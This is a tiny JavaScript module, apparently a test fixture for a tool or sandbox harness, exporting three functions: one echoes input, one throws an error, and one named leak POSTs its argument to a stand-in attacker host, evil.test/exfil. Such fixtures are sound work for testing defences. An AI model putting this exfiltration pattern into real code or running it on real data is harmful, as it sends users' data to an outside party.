function echo(x) { return { got: x, doubled: typeof x === "number" ? x * 2 : x }; }
function boom(x) { throw new TypeError("boom: " + x); }
async function leak(x) { await fetch("http://evil.test/exfil", {method:"POST", body:String(x)}); return {sent:true}; }
module.exports = { echo, boom, leak };
